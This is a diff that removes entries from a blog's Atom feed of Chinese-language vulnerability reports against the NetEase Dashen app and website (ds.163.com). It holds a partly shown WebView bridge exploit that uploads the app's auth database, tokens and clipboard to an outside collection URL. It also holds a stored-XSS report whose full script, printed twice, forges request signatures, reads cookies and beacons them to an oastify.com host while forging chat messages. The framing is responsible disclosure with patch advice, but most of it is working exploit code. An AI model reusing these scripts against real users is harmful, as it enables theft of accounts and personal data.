-        {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/data/data/com.netease.gl/databases/auth",isShowProgressTips:1}},
-        function(res){
-            
-            console.log("upload file:", "/data/data/com.netease.gl/databases/auth")
-            if(res.code==200){
-                var localId = res.result.localId;
-                //上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
-                WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:localId,isShowProgressTips:1,usageType:1}},function(res2){
-                    if(res2.code==200){
-                        var fileData = res2.result
-                        console.log("获取数据库文件成功！！！")
-
-                        var finalData = {
-                            usrInfo:usrInfo,
-                            tokenInfo:tokenInfo,
-                            clipData:clipData,
-                            fileData:fileData
-                        }
-                        // send data
-                        var encoded = encode(JSON.stringify(finalData))
-                        justSend(api_burp + '?data=' + encoded)
-                    }
-                    })
-            }
-        })
-        
-}
-// 判断pc端还是手机端
-const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-if (isMobile) {
-    /* your code here */
-    sendData()
-}       
-</code></pre></div>    </div>
-
-    <p>完整利用过程请看POC视频</p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频
-视频链接：链接：https://pan.baidu.com/s/1ujV4aKjagPCMNhhxELePgg 提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-<p>该漏洞影响最新大神客户端Webview，通过访问含有xss的手机版大神网页，能够在应用内部webview中执行xss，攻击者能够获取受害者手机号、粘贴板数据、请求token、聊天数据、应用database、应用shared_prefs、应用内部所有存储文件、外置存储sdcard指定文件等，造成严重的客户端数据泄漏。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-<ol>
-  <li>对手机版网页端https://ds.163.com/ 中的dompurify升级到最新版</li>
-  <li>对应用内置webview js interface接口WebViewJavascriptBridge，进行更严格的权限控制，特别是文件上传功能downloadImage</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><category term="jsinterface" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：网易大神Web端频道签到消息存储型XSS漏洞</title><link href="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html" rel="alternate" type="text/html" title="中危：网易大神Web端频道签到消息存储型XSS漏洞" /><published>2023-10-19T10:26:18+08:00</published><updated>2023-10-19T10:26:18+08:00</updated><id>http://localhost:4000/xss/2023/10/19/xss-innerhtml</id><content type="html" xml:base="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>网易大神Web端频道签到消息存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg</li>
-  <li>POC网页 https://ds.163.com/channel/0149881854/1459481/ 打开后在终端打印111222233</li>
-  <li>视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314</li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /v1/web/chat-room-msg/send-msg HTTP/1.1
-Host: inf-im.ds.163.com
-Connection: close
-Content-Length: 586
-GL-CheckSum: 20c428fbe325f20d1ff139943dafd2334814804e_28aebbff3e33281f4afe3ebcf0b19ae90ba97998
-sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
-sec-ch-ua-mobile: ?0
-GL-Uid: xxxxxxx
-GL-DeviceId: 1189888043.1694780319
-Content-Type: application/json;charset=UTF-8
-Accept: application/json, text/plain, */*
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
-GL-ClientType: 61
-GL-Nonce: xxxx
-GL-X-XSRF-TOKEN: xxxxx
-sec-ch-ua-platform: "Windows"
-Origin: https://ds.163.com
-Sec-Fetch-Site: same-site
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://ds.163.com/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cookie: xxx
-
-{ "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(2222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-<p>网易大神web版中，聊天频道发布签到消息(IMAGE_TEXT_TEMPLATE)时，没有对签到的内容进行过滤，而是直接将签到内容赋值给innerHTML，直接造成存储型XSS攻击。</p>
-
-<h3 id="detail">Detail</h3>
-<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>登录大神Web平台 https://ds.163.com/</li>
-  <li>
-    <p>进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
-发消息测试，并且通过burpsuite观察请求包结构</p>
-
-    <p><img src="/assets/images/sendmsg.png" alt="sendmsg" /></p>
-
-    <p>可以从请求头header中看到，前端对请求体做了校验，攻击者直接修改请求体是不可行的
- <img src="/assets/images/checksum.png" alt="checksum" /></p>
-  </li>
-  <li>
-    <p>为了绕过校验，对前端的校验流程进行简单的逆行分析定位到校验函数，并且成功获取函数handler。
- https://g.166.net/res/a19/umi.b2e4db33.js 中的gen_sign函数对原始的请求体进行了校验并且返回校验的结果，如下：
- <img src="/assets/images/sign.png" alt="sign" />
- 继续分析，发现gen_sign函数来源于https://g.166.net/opd/latest/sig/bootstrap.js的sig模块，通过sig.default()能够初始化并且返回模块，从而获取到gen_sign函数handler
- <img src="/assets/images/module.png" alt="module" />
- 测试对请求体进行校验：
- <img src="/assets/images/gensign.png" alt="gensign" /></p>
-  </li>
-  <li>至此，我们能够对请求体进行篡改并且带上合法的校验头。通过debug发现签到消息直接渲染到了前端没有进行过滤。这点是通过untrusted type chrome插件定位的。</li>
-  <li>
-    <p>而签到消息的结构体可以从消息获取请求中得到，如下图。获取结构体后，我们便可以构造xss payload，并且发送该消息。</p>
-
-    <p><img src="/assets/images/qiandaotype.png" alt="qiandaotype" /></p>
-
-    <p>由此构造最终的xss payload，其中serverID，channelID，squareID分别是频道相关的id号，表示需要把消息发送给哪个聊天群。fromUid是消息发送者的id，content.data字段便是xss的注入点位, contentType务必填写IMAGE_TEXT_TEMPLATE类型：</p>
-
-    <p>{ “serverId”: “0149881854”, “channelId”: “1459481”, “squareId”: “60054a7dd5456877d226706e”, “fromUid”: “b1fbb501020c46ff88577a3fe103c0ec”, “fromNick”: “”, “msgType”: “CHAT_ROOM_MSG”, “sourceType”: “GOD_WEB”, “content”: [{ “type”: “TITLE”, “data”: { “banner”: “”, “icon”: “https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870”, “atUser”: “@灯中烛火”, “text”: “签到成功！” }, “order”: 0.0 }, { “type”: “TEXT”, “data”: “&lt;img src=x onerror=console.log(1111122222233)&gt;”, “order”: 1.0 }, { “type”: “BUTTON”, “data”: [{ “text”: “立即抽奖”, “action”: { “type”: “OPEN_URL”, “data”: “https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+” } }], “order”: 2.0 }], “contentType”: “IMAGE_TEXT_TEMPLATE” }</p>
-
-    <p>为简化操作，写一个js文件，实现自动发帖，将上述payload通过本js脚本发送，请在大神网页的Console中执行。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
- const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
- // init webassembly and get sig_gen function
- // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
- var moduleX;
- Promise.all([sig.default()]).then(function (t) {
-     moduleX = t
- })
-
- // 获取cookie信息
- const getCookieValue = (name) =&gt; (
-     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
- )
-
- const myFetch = async (url, headers) =&gt; {
-     let data = await fetch(url, {
-         method: 'GET',
-         headers: headers,
-         credentials: 'include'
-     })
-     let res = await data.json();
-     return res
- }
- // 构造GET发送请求
- const setHeaderDs = (payload) =&gt; {
-     var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
-     var GL_Uid = getCookieValue('GOD_UUID')
-     var checkres = moduleX['0'].gen_sign(payload)
-     var checkjson = JSON.parse(checkres)
-     var GL_CheckSum = checkjson['sign']
-     var GL_Nonce = checkjson['timestamp']
-     var GL_ClientType = 61
-     var GL_DeviceId = localStorage.getItem('ns-client-id')
-     var headers = {
-         'GL-CheckSum': GL_CheckSum,
-         'GL-Nonce': GL_Nonce,
-         'GL-Uid': GL_Uid,
-         'GL-DeviceId': GL_DeviceId,
-         'GL-ClientType': GL_ClientType,
-         'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
-         'Content-Type': 'application/json;charset=UTF-8'
-     }
-     return headers
- }
-
- // 构造POST发送请求
- const myPostFetch = async (url, headers, payload) =&gt; {
-     let data = await fetch(url, {
-         method: 'POST',
-         headers: headers,
-         credentials: 'include',
-         body: JSON.stringify(payload),
-     })
-     let res = await data.json();
-     return res
- }
-
- // 通过img src来向burpsuite collaborator url外送敏感新信息
- const justSend = async url =&gt; {
-     var Img = new Image
-     Img.src = url
- }
-
- // base64 加解密
- const encode = str =&gt; {
-     var b64 = btoa(unescape(encodeURIComponent(str)))
-     return b64
- }
- const decode = str =&gt; {
-     var str = decodeURIComponent(escape(atob(str)));
-     return str
- }
- //获取并发送cookie，带有手机号
- const sendCookie = () =&gt; {
-     var encoded = encode(document.cookie)
-     // send data
-     justSend(api_burp + '?data=' + encoded)
- }
-
- // 发送xss payload
- const startSendLinkMessage = async function () {
-
-     // 链接，设置fromUid为攻击者的UID
-     var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
-
-     var headers = setHeaderDs(JSON.stringify(payload_json))
-     res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
- }
- startSendLinkMessage()
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>结果展示
- payload已经渲染到前端</p>
-
-    <p><img src="/assets/images/consolelog.png" alt="consolelog" />
- payload已经执行：</p>
-
-    <p><img src="/assets/images/consolelog2.png" alt="consolelog2" /></p>
-  </li>
-  <li>该XSS的利用</li>
-</ol>
-
-<ul>
-  <li>首先是窃取cookie，可能会带有邮箱和手机号信息
-<a href="/assets/images/cookie.png">cookie</a></li>
-  <li>伪造发送消息等
-前面通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。</li>
-</ul>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频
-视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314
-完整利用脚本如下：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // burpsuite collaborator url
-    const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
-    // init webassembly and get sig_gen function
-    // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
-    var moduleX;
-    Promise.all([sig.default()]).then(function (t) {
-        moduleX = t
-    })
-
-    // 获取cookie信息
-    const getCookieValue = (name) =&gt; (
-        document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
-    )
-
-    const myFetch = async (url, headers) =&gt; {
-        let data = await fetch(url, {
-            method: 'GET',
-            headers: headers,
-            credentials: 'include'
-        })
-        let res = await data.json();
-        return res
-    }
-    // 构造GET发送请求
-    const setHeaderDs = (payload) =&gt; {
-        var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
-        var GL_Uid = getCookieValue('GOD_UUID')
-        var checkres = moduleX['0'].gen_sign(payload)
-        var checkjson = JSON.parse(checkres)
-        var GL_CheckSum = checkjson['sign']
-        var GL_Nonce = checkjson['timestamp']
-        var GL_ClientType = 61
-        var GL_DeviceId = localStorage.getItem('ns-client-id')
-        var headers = {
-            'GL-CheckSum': GL_CheckSum,
-            'GL-Nonce': GL_Nonce,
-            'GL-Uid': GL_Uid,
-            'GL-DeviceId': GL_DeviceId,
-            'GL-ClientType': GL_ClientType,
-            'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
-            'Content-Type': 'application/json;charset=UTF-8'
-        }
-        return headers
-    }
-
-    // 构造POST发送请求
-    const myPostFetch = async (url, headers, payload) =&gt; {
-        let data = await fetch(url, {
-            method: 'POST',
-            headers: headers,
-            credentials: 'include',
-            body: JSON.stringify(payload),
-        })
-        let res = await data.json();
-        return res
-    }
-
-    // 通过img src来向burpsuite collaborator url外送敏感新信息
-    const justSend = async url =&gt; {
-        var Img = new Image
-        Img.src = url
-    }
-
-    // base64 加解密
-    const encode = str =&gt; {
-        var b64 = btoa(unescape(encodeURIComponent(str)))
-        return b64
-    }
-    const decode = str =&gt; {
-        var str = decodeURIComponent(escape(atob(str)));
-        return str
-    }
-    //获取并发送cookie，可能带有手机号
-    const sendCookie = () =&gt; {
-        var encoded = encode(document.cookie)
-        // send data
-        justSend(api_burp + '?data=' + encoded)
-    }
-
-    // 发送xss payload
-    const startSendLinkMessage = async function () {
-
-        // 链接，设置fromUid为攻击者的UID
-        var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
-
-        var headers = setHeaderDs(JSON.stringify(payload_json))
-        res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
-    }
-    // 判断pc端还是手机端
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    if (isMobile) {
-        /* your code here */
-    } else {
-        //web端
-        //发送cookie
-        sendCookie()
-        //伪造发分享消息
-        startSendLinkMessage()
-    }
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-<p>该漏洞影响网页端所有聊天频道，注意到每个游戏频道都有几十上百万用户，影响深远。用户只要进入聊天界面，无需任何操作就能够遭受攻击。</p>
-<ol>
-  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；</li>
-  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。</li>
-</ol>
-
-<h2 id="patch-advice">Patch advice</h2>
-<ol>
-  <li>对签到的内容进行过滤，而非直接复杂给innerHTML</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
